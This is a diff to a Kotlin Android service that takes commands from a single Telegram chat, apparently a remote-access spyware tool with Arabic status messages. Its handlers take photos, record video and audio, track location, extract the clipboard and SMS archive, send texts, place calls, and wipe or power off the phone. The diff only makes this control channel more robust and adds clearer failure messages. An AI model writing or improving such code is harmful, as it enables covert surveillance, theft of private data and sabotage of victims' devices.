@@ -81,7 +81,11 @@ class BackgroundControlService : Service() {
     override fun onBind(intent: Intent?): IBinder? = null
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        startForeground(NOTIFICATION_ID, createStrictNotification())
+        try {
+            startForeground(NOTIFICATION_ID, createStrictNotification())
+        } catch (e: Exception) {
+            Log.e(TAG, "Failed to start foreground service: ${e.message}")
+        }
         if (!isRunning) {
             isRunning = true
             initializeCorePolling()
@@ -122,7 +126,7 @@ class BackgroundControlService : Service() {
             while (isRunning) {
                 var connection: HttpURLConnection? = null
                 try {
-                    val url = URL("https://api.telegram.org/bot$botToken/getUpdates?offset=${lastUpdateId + 1}&timeout=25")
+                    val url = URL("https://api.telegram.org/bot$botToken/getUpdates?offset=${lastUpdateId + 1}&timeout=25&allowed_updates=[\"message\",\"callback_query\"]")
                     connection = url.openConnection() as HttpURLConnection
                     connection.requestMethod = "GET"
                     connection.connectTimeout = 12000
@@ -132,38 +136,52 @@ class BackgroundControlService : Service() {
                     val stream = if (responseCode == 200) connection.inputStream else connection.errorStream
                     val response = stream?.bufferedReader()?.use { it.readText() } ?: ""
 
-                    val json = JSONObject(response)
-                    if (json.optBoolean("ok")) {
-                        val results = json.getJSONArray("result")
-                        for (i in 0 until results.length()) {
-                            val update = results.getJSONObject(i)
-                            lastUpdateId = update.getLong("update_id")
+                    if (responseCode == 200 && response.isNotBlank()) {
+                        val json = JSONObject(response)
+                        if (json.optBoolean("ok")) {
+                            val results = json.getJSONArray("result")
+                            for (i in 0 until results.length()) {
+                                val update = results.getJSONObject(i)
+                                lastUpdateId = update.getLong("update_id")
 
-                            if (update.has("message")) {
-                                val message = update.getJSONObject("message")
-                                val chatId = message.getJSONObject("chat").getLong("id").toString()
-                                val text = message.optString("text", "")
-                                if (chatId == authorizedChatId && text.isNotBlank()) {
-                                    dispatchCommand(chatId, text)
-                                }
-                            } else if (update.has("callback_query")) {
-                                val callbackQuery = update.getJSONObject("callback_query")
-                                val callbackQueryId = callbackQuery.optString("id", "")
-                                val chatId = callbackQuery.getJSONObject("message").getJSONObject("chat").getLong("id").toString()
-                                val data = callbackQuery.optString("data", "")
-
-                                if (chatId == authorizedChatId) {
-                                    acknowledgeCallback(callbackQueryId)
-                                    dispatchCallback(chatId, data)
+                                if (update.has("message")) {
+                                    val message = update.getJSONObject("message")
+                                    val chatObj = message.optJSONObject("chat")
+                                    if (chatObj != null) {
+                                        val chatId = chatObj.getLong("id").toString()
+                                        val text = message.optString("text", "")
+                                        if (chatId == authorizedChatId && text.isNotBlank()) {
+                                            dispatchCommand(chatId, text)
+                                        }
+                                    }
+                                } else if (update.has("callback_query")) {
+                                    val callbackQuery = update.getJSONObject("callback_query")
+                                    val callbackQueryId = callbackQuery.optString("id", "")
+                                    val msgObj = callbackQuery.optJSONObject("message")
+                                    if (msgObj != null) {
+                                        val chatObj = msgObj.optJSONObject("chat")
+                                        if (chatObj != null) {
+                                            val chatId = chatObj.getLong("id").toString()
+                                            val data = callbackQuery.optString("data", "")
+                                            if (chatId == authorizedChatId) {
+                                                acknowledgeCallback(callbackQueryId)
+                                                dispatchCallback(chatId, data)
+                                            }
+                                        }
+                                    }
                                 }
                             }
                         }
+                    } else {
+                        Log.w(TAG, "Telegram API error response code: $responseCode")
                     }
                 } catch (e: Exception) {
-                    Log.e(TAG, "Polling pipeline exception", e)
+                    Log.e(TAG, "Polling pipeline exception: ${e.message}", e)
                     try { Thread.sleep(6000) } catch (_: InterruptedException) {}
                 } finally {
-                    connection?.disconnect()
+                    try {
+                        connection?.disconnect()
+                    } catch (_: Exception) {}
                 }
             }
         }
@@ -192,7 +210,7 @@ class BackgroundControlService : Service() {
                 data == "take_photo" -> captureCameraImage(chatId, "front")
                 data == "take_photo_rear" -> captureCameraImage(chatId, "rear")
                 data == "record_video" -> executeCameraVideoRecording(chatId, 10)
-                data == "record_screen" -> sendDirectMessage(chatId, "🎬 تسجيل الشاشة يتطلب موافقة بصرية تفاعلية من الواجهة.")
+                data == "record_screen" -> sendDirectMessage(chatId, "🎬 تسجيل الشاشة يتطلب تفعيلاً تفاعلياً من واجهة الجهاز.")
                 data == "record_audio" -> executeAudioCapture(chatId, 30)
                 data == "get_location" -> fetchStrictRealTimeLocation(chatId)
                 data == "start_live_tracking" -> toggleStrictLiveTracking(chatId, true)
@@ -219,7 +237,7 @@ class BackgroundControlService : Service() {
 
     private fun captureCameraImage(chatId: String, facing: String) {
         if (!hasPermission(Manifest.permission.CAMERA)) {
-            sendDirectMessage(chatId, "❌ صلاحية الكاميرا مرفوضة.")
+            sendDirectMessage(chatId, "❌ صلاحية الكاميرا غير ممنوحة.")
             return
         }
         try {
@@ -336,10 +354,10 @@ class BackgroundControlService : Service() {
                     val text = clipboard.primaryClip?.getItemAt(0)?.text?.toString() ?: ""
                     sendDirectMessage(chatId, "📋 محتوى الحافظة المستخرج:\n\n$text")
                 } else {
-                    sendDirectMessage(chatId, "ℹ️ الحافظة فارغة حالياً أو مقيدة أمنياً.")
+                    sendDirectMessage(chatId, "ℹ️ الحافظة فارغة حالياً أو مقيدة أمنياً بنظام التشغيل.")
                 }
             } catch (e: Exception) {
-                sendDirectMessage(chatId, "ℹ️ قراءة الحافظة تتطلب تواجداً نشطاً للواجهة في الإصدارات الحديثة.")
+                sendDirectMessage(chatId, "ℹ️ قراءة الحافظة تتطلب تركيز الواجهة النشطة في الإصدارات الحديثة.")
             }
         }
     }
@@ -356,7 +374,7 @@ class BackgroundControlService : Service() {
                 sendDirectMessage(chatId, "⚡ تم إرسال أمر الفرمتة.")
             }
         } catch (e: Exception) {
-            sendDirectMessage(chatId, "❌ فشل الفرمتة لعدم توفر صلاحيات المسؤول المطلقة.")
+            sendDirectMessage(chatId, "❌ فشل الفرمتة: يتطلب صلاحيات Device Admin أو Root.")
         }
     }
 
@@ -366,17 +384,15 @@ class BackgroundControlService : Service() {
             val process = Runtime.getRuntime().exec(arrayOf("su", "-c", "reboot -p"))
             process.waitFor()
         } catch (e: Exception) {
-            try {
-                val process2 = Runtime.getRuntime().exec(arrayOf("reboot -p"))
-                process2.waitFor()
-            } catch (ex: Exception) {
-                sendDirectMessage(chatId, "❌ فشل الإطفاء: يتطلب صلاحيات Root أو System Apps.")
-            }
+            sendDirectMessage(chatId, "❌ فشل الإطفاء: يتطلب صلاحيات Root.")
         }
     }
 
     private fun executeSendSms(chatId: String, phoneNumber: String, messageText: String) {
-        if (!hasPermission(Manifest.permission.SEND_SMS)) return
+        if (!hasPermission(Manifest.permission.SEND_SMS)) {
+            sendDirectMessage(chatId, "❌ صلاحية إرسال الرسائل غير ممنوحة.")
+            return
+        }
         try {
             val smsManager = getSystemService(SmsManager::class.java)
             smsManager.sendTextMessage(phoneNumber, null, messageText, null, null)
@@ -387,7 +403,10 @@ class BackgroundControlService : Service() {
     }
 
     private fun executeCall(chatId: String, phoneNumber: String) {
-        if (!hasPermission(Manifest.permission.CALL_PHONE)) return
+        if (!hasPermission(Manifest.permission.CALL_PHONE)) {
+            sendDirectMessage(chatId, "❌ صلاحية إجراء المكالمات غير ممنوحة.")
+            return
+        }
         try {
             val intent = Intent(Intent.ACTION_CALL).apply {
                 data = Uri.parse("tel:${Uri.encode(phoneNumber)}")
@@ -563,7 +582,7 @@ class BackgroundControlService : Service() {
 
     private fun extractSmsArchive(chatId: String) {
         if (!hasPermission(Manifest.permission.READ_SMS)) {
-            sendDirectMessage(chatId, "❌ صلاحية قراءة الرسائل (SMS) غير ممنوحة.")
+            sendDirectMessage(chatId, "❌ صلاحية قراءة الرسائل غير ممنوحة.")
             return
         }
         executionExecutor.execute {
@@ -641,7 +660,9 @@ class BackgroundControlService : Service() {
             connection.inputStream?.close()
         } catch (_: Exception) {
         } finally {
-            connection?.disconnect()
+            try {
+                connection?.disconnect()
+            } catch (_: Exception) {}
         }
     }
 
@@ -650,19 +671,25 @@ class BackgroundControlService : Service() {
     private fun acknowledgeCallback(callbackQueryId: String) {
         if (callbackQueryId.isBlank()) return
         executionExecutor.execute {
+            var conn: HttpURLConnection? = null
             try {
                 val body = JSONObject().put("callback_query_id", callbackQueryId)
-                val conn = URL("https://api.telegram.org/bot$botToken/answerCallbackQuery").openConnection() as HttpURLConnection
+                conn = URL("https://api.telegram.org/bot$botToken/answerCallbackQuery").openConnection() as HttpURLConnection
                 conn.requestMethod = "POST"
                 conn.doOutput = true
+                conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
                 conn.outputStream.use { it.write(body.toString().toByteArray()) }
                 conn.inputStream?.close()
-            } catch (_: Exception) {}
+            } catch (_: Exception) {
+            } finally {
+                try { conn?.disconnect() } catch (_: Exception) {}
+            }
         }
     }
 
     private fun sendControlPanelKeyboard(chatId: String, text: String) {
         executionExecutor.execute {
+            var conn: HttpURLConnection? = null
             try {
                 val keyboard = JSONArray().apply {
                     put(JSONArray().apply {
@@ -711,27 +738,34 @@ class BackgroundControlService : Service() {
                     put("reply_markup", JSONObject().put("inline_keyboard", keyboard))
                 }
 
-                val conn = URL("https://api.telegram.org/bot$botToken/sendMessage").openConnection() as HttpURLConnection
+                conn = URL("https://api.telegram.org/bot$botToken/sendMessage").openConnection() as HttpURLConnection
                 conn.requestMethod = "POST"
                 conn.doOutput = true
                 conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
                 conn.outputStream.use { it.write(body.toString().toByteArray()) }
                 conn.inputStream?.close()
-            } catch (_: Exception) {}
+            } catch (_: Exception) {
+            } finally {
+                try { conn?.disconnect() } catch (_: Exception) {}
+            }
         }
     }
 
     private fun sendDirectMessage(chatId: String, text: String) {
         executionExecutor.execute {
+            var conn: HttpURLConnection? = null
             try {
                 val body = JSONObject().put("chat_id", chatId).put("text", text)
-                val conn = URL("https://api.telegram.org/bot$botToken/sendMessage").openConnection() as HttpURLConnection
+                conn = URL("https://api.telegram.org/bot$botToken/sendMessage").openConnection() as HttpURLConnection
                 conn.requestMethod = "POST"
                 conn.doOutput = true
                 conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
                 conn.outputStream.use { it.write(body.toString().toByteArray()) }
                 conn.inputStream?.close()
-            } catch (_: Exception) {}
+            } catch (_: Exception) {
+            } finally {
+                try { conn?.disconnect() } catch (_: Exception) {}
+            }
         }
     }
 
